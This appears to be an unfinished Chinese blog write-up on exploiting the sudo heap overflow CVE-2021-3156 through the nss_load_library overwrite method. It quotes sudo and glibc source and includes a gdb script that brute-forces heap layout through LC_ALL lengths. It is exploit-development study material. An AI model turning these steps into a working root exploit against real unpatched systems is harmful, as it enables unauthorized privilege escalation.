# 第二种方法

### 漏洞分析



漏洞存在位置

```c
	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
		/*
		 * When running a command via a shell, the sudo front-end
		 * escapes potential meta chars.  We unescape non-spaces
		 * for sudoers matching and logging purposes.
		 */
		for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
		    while (*from) {
			if (from[0] == '\\' && !isspace((unsigned char)from[1]))
			    from++;
			*to++ = *from++;
		    }
		    *to++ = ' ';
		}
		*--to = '\0';
```

这个怎么说呢 

首先 这里的 NewArgv 就是 命令行传进去的参数 比如  sudo  aaaaaa bbbbbb eeeeeeeee cccc

这里 就会分开 变成一个二维数组

```
NewArgv[][]={aaaaaaa

bbbbbb

eeeeee

ccccccc}
```



所以这里代码就是拷贝 而 NewArgv 里面的内容 就是 地址，但是这些数据 比如 aaaaaa bbbb 都是以 `\x00` 结尾的，正常的复制，是没什么问题

但是 如果 这时候 存在一个 `\` 

这时候 会进入

```c
		if (from[0] == '\\' && !isspace((unsigned char)from[1])) [1]
			    from++;											 [2]
			*to++ = *from++;									 [3]	
```

在 [1]的时候 会进入到if里面

然后 from 就会往前走一个byte，然后这时候 from 就会执行 `\x00` ,然后拷贝了，再往前走，这时候就会越界访问到下个 参数的内存了

但是这个设计是为什么存在呢 ，其实 是因为 一般情况下 命令的参数 除了 `-` `_` `$` 都会转义

具体在下面

```c
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
	char **av, *cmnd = NULL;
	int ac = 1;

	if (argc != 0) {
	    /* shell -c "command" */
	    char *src, *dst;
	    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
		strlen(argv[argc - 1]) + 1; // size+1

	    cmnd = dst = reallocarray(NULL, cmnd_size, 2);
	    if (cmnd == NULL)
		sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	    if (!gc_add(GC_PTR, cmnd))
		exit(1);

	    for (av = argv; *av != NULL; av++) {
		for (src = *av; *src != '\0'; src++) {
		    /* quote potential meta characters */
		    if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
			*dst++ = '\\';  // 转义
		    *dst++ = *src;
		}
		*dst++ = ' ';
	    }
	    if (cmnd != dst)
		dst--;  /* replace last space with a NUL */
	    *dst = '\0';

	    ac += 2; /* -c cmnd */
	}

	av = reallocarray(NULL, ac + 1, sizeof(char *));
	if (av == NULL)
	    sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	if (!gc_add(GC_PTR, av))
	    exit(1);

	av[0] = (char *)user_details.shell; /* plugin may override shell */
	if (cmnd != NULL) {
	    av[1] = "-c";
	    av[2] = cmnd;
	}
	av[ac] = NULL;

	argv = av;
	argc = ac;
    }
```

但是 要进入这里有满足 两个mode 一个 MODE_RUN 另一个是 MODE_SHELL

先说下 MODE_RUN的set

```c
	if ((ch = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
	    switch (ch) {
		case 'A':
		    SET(tgetpass_flags, TGP_ASKPASS);
		    break;
#ifdef HAVE_BSD_AUTH_H
		case 'a':
		    assert(optarg != NULL);
		    if (*optarg == '\0')
			usage(1);
		    sudo_settings[ARG_BSDAUTH_TYPE].value = optarg;
		    break;
#endif
************************************
	}
    }

    argc -= optind;
    argv += optind;

    if (!mode) {
	/* Defer -k mode setting until we know whether it is a flag or not */
	if (sudo_settings[ARG_IGNORE_TICKET].value != NULL) {
	    if (argc == 0 && !(flags & (MODE_SHELL|MODE_LOGIN_SHELL))) {
		mode = MODE_INVALIDATE;	/* -k by itself */
		sudo_settings[ARG_IGNORE_TICKET].value = NULL;
		valid_flags = 0;
	    }
	}
	if (!mode)     //[1]
	    mode = MODE_RUN;		/* running a command */
    }
```

这里可以看到mode 置 MODE_RUN只有 在switch里面，mode没有赋值，也就是为0的时候才会 赋值 MODE_RUN

所以 只要前面 设置了 mode的值 不等于0，就不会触发[1]，进入到里面赋值

所以 就不会转义，那 `\` 就是 不转义传进去

然后 如何进入到

```c
	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
		/*
		 * When running a command via a shell, the sudo front-end
		 * escapes potential meta chars.  We unescape non-spaces
		 * for sudoers matching and logging purposes.
		 */
		for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
		    while (*from) {
			if (from[0] == '\\' && !isspace((unsigned char)from[1]))
			    from++;
			*to++ = *from++;
		    }
		    *to++ = ' ';
		}
		*--to = '\0';
```

进入也要满足两个mode其中 一个就能进入了，一个是MODE_SHELL 另一个是 MODE_LOGIN_SHELL

MODE_SHELL 可以用 `-s` 参数

```c
		case 'S':
		    SET(tgetpass_flags, TGP_STDIN);
		    break;
		case 's':
		    sudo_settings[ARG_USER_SHELL].value = "true";
		    SET(flags, MODE_SHELL);
		    break;
```

这里还有一个检测

```c
    if ((argc == 0 && mode == MODE_EDIT) ||
	(argc > 0 && !ISSET(mode, MODE_RUN | MODE_EDIT | MODE_CHECK)))
	usage(1);
    if (argc == 0 && mode == MODE_RUN && !ISSET(flags, MODE_SHELL)) {
	SET(flags, (MODE_IMPLIED_SHELL | MODE_SHELL));
	sudo_settings[ARG_IMPLIED_SHELL].value = "true";
    }
```

如果  (argc > 0 && !ISSET(mode, MODE_RUN | MODE_EDIT | MODE_CHECK))

参数的个数大于 0 但 没有 set 这三种 mode ，就会打印出 usage，也就等于退出了

然后往上查找 `MODE_EDIT `  这个mode

```c
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
	progname = "sudoedit";
	mode = MODE_EDIT;
	sudo_settings[ARG_SUDOEDIT].value = "true";
    }
```

这里刚刚好，就有一个，也就是说要用sudoedit来启动，看了下sudoedit

其实就是sudo的一个链接

然后上面都满足了，接下来就是构造exp，这里利用的是[wp](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)这里说的第二种

### 漏洞利用

要利用这个函数  nss_load_library 

```c
static int
nss_load_library (service_user *ni)
{
  if (ni->library == NULL)
    {
      /* This service has not yet been used.  Fetch the service
	 library for it, creating a new one if need be.  If there
	 is no service table from the file, this static variable
	 holds the head of the service_library list made from the
	 default configuration.  */
      static name_database default_table;
      ni->library = nss_new_service (service_table ?: &default_table,
				     ni->name);
      if (ni->library == NULL)
	return -1;
    }

  if (ni->library->lib_handle == NULL)
    {
      /* Load the shared library.  */
      size_t shlen = (7 + strlen (ni->name) + 3
		      + strlen (__nss_shlib_revision) + 1);
      int saved_errno = errno;
      char shlib_name[shlen];

      /* Construct shared object name.  */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      "libnss_"),
				    ni->name),
			  ".so"),
		__nss_shlib_revision);

      ni->library->lib_handle = __libc_dlopen (shlib_name);
      if (ni->library->lib_handle == NULL)
	{
	  /* Failed to load the library.  */
	  ni->library->lib_handle = (void *) -1l;
	  __set_errno (saved_errno);
	}
# ifdef USE_NSCD
      else if (is_nscd)
	{
	  /* Call the init function when nscd is used.  */
	  size_t initlen = (5 + strlen (ni->name)
			    + strlen ("_init") + 1);
	  char init_name[initlen];

	  /* Construct the init function name.  */
	  __stpcpy (__stpcpy (__stpcpy (init_name,
					"_nss_"),
			      ni->name),
		    "_init");

	  /* Find the optional init function.  */
	  void (*ifct) (void (*) (size_t, struct traced_file *))
	    = __libc_dlsym (ni->library->lib_handle, init_name);
	  if (ifct != NULL)
	    {
	      void (*cb) (size_t, struct traced_file *) = nscd_init_cb;
#  ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cb);
#  endif
	      ifct (cb);
	    }
	}
# endif
    }

  return 0;
}
```

这个函数存在于libc中，用来解析一些so的

但是为什么选这个？，因为这个内存 与 bin上的tache 非常近，在进行copy的时候，会malloc一次，而malloc的size由我们控制着，size就是参数的size

下面是三个设计到的结构体

```c
service_user
name_database_entry


typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;

/* To access the action based on the status value use this macro.  */
#define nss_next_action(ni, status) ((ni)->actions[2 + status])


typedef struct name_database_entry
{
  /* And the link to the next entry.  */
  struct name_database_entry *next;
  /* List of service to be used.  */
  service_user *service;
  /* Name of the database.  */
  char name[0];
} name_database_entry;


```

这个两个结构体

在 nss_load_library 函数里面 有一个 这样的函数  __libc_dlopen ，这个函数执行的时候，会加载 一个so文件，然后会调用init 

然后就是进入的路径了

```c
static int
nss_load_library (service_user *ni)
{
  if (ni->library == NULL)//[1]
    {
      /* This service has not yet been used.  Fetch the service
	 library for it, creating a new one if need be.  If there
	 is no service table from the file, this static variable
	 holds the head of the service_library list made from the
	 default configuration.  */
      static name_database default_table;
      ni->library = nss_new_service (service_table ?: &default_table,
				     ni->name);//[2]
      if (ni->library == NULL)
	return -1;
    }

  if (ni->library->lib_handle == NULL)//[3]
    {
      /* Load the shared library.  */
      size_t shlen = (7 + strlen (ni->name) + 3
		      + strlen (__nss_shlib_revision) + 1);
      int saved_errno = errno;
      char shlib_name[shlen];

      /* Construct shared object name.  */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
					      "libnss_"),
				    ni->name),
			  ".so"),
		__nss_shlib_revision);//[4]

      ni->library->lib_handle = __libc_dlopen (shlib_name);//[5]
```

进入 [1] 然后 进入到 [2] 这时候的 library 是一个new的 然后 handle就肯定是 0了

然后 就是下面了

[4] 组合一个文件名，ni->name 我们控制，然后就组成我们想要的名字了

然后 就是[5]了，在那个so 写好init 来进行提权就ok了

### 遇到的问题

1、在service_user结构体和 tcache之间出现

```c
service_user 这个结构体
name_database_entry    
typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;

/* To access the action based on the status value use this macro.  */
#define nss_next_action(ni, status) ((ni)->actions[2 + status])


typedef struct name_database_entry
{
  /* And the link to the next entry.  */
  struct name_database_entry *next;
  /* List of service to be used.  */
  service_user *service;
  /* Name of the database.  */
  char name[0];
} name_database_entry;

```

这个结构体 这个两个结构体不好覆盖 ，怎么说呢  service_user 这个结构体涉及到一个链表结构，修改了next就回不去，下一个要解析的是systemd

如果next指针修改了就访问不到 systemd ，就算修改了 sysemd 为 X/X 也没什么用，这时候就要打乱堆的分配

然后 有个这样的

```
    setlocale(LC_ALL, "");
```

在main下面一点点

这个会为 LC_开头的 环境变量分配内存，然后free掉

这时候就可以打乱堆中的分配使得

```c
typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;c
```

这个结构体在 tcache中的bin的下面

但这个。。还是得fuzz，或者爆破

```python
import gdb
import time
import re
gdb.execute('file /usr/bin/sudoedit')
payload = "set args -s 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\'"
gdb.execute(payload)

gdb.execute("b *0x00007ffff5b85c88")
gdb.execute("b *0x0000555555559674")
#gdb.execute("b sudo.c:155")
#gdb.execute("b *0x7ffff7ec4152")

#gdb.execute("dis 3")

for i in range(20,0x100):
    payload = 'a'*i
    gdb.execute("set environment LC_ALL C.UTF-8@"+payload)
    gdb.execute("dis 1")
    gdb.execute("r")
    gdb.execute("en 1")
    try:
        s = gdb.execute("search -s systemd",to_string=True)
        a1=int(s[32:32+12],16)
        a2=int(s[114:114+12],16)
        print("[*] "+str(i))
        print("[-] "+str(hex(a1)))
        print("[-] "+str(hex(a2)))
        print("[=] "+str(hex(int(s[114:114+12],16)-int(s[32:32+12],16))))
        if a2-a1 >0xa0:
            f= open(str(i)+'.log2','w+')
            f.write(s)
            f.close()
    except:
        pass

#gdb.execute('quit')
```



用生成的文件，然后再一个调试

未完，待续

参考链接

[writeup](https://www.kalmarunionen.dk/writeups/sudo/)

[baron](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)

